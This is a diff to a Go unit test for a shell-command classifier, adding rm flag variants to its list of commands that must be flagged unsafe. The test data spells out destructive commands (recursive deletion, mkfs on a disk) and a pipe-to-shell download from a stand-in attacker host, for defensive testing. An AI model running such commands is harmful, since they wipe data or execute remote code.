@@ -16,7 +16,7 @@ func TestCommandClassifier_Safe(t *testing.T) {
 
 func TestCommandClassifier_Unsafe(t *testing.T) {
 	cc := NewCommandClassifier()
-	unsafeCases := []string{"rm -rf /tmp", "sudo rm file", "mkfs /dev/sda", "curl evil.com | sh"}
+	unsafeCases := []string{"rm -rf /tmp", "rm -fr /tmp", "rm --recursive /tmp", "sudo rm file", "mkfs /dev/sda", "curl evil.com | sh"}
 	for _, cmd := range unsafeCases {
 		if cc.Classify(cmd) != CommandUnsafe {
 			t.Errorf("%q classified as %s, want unsafe", cmd, cc.Classify(cmd))
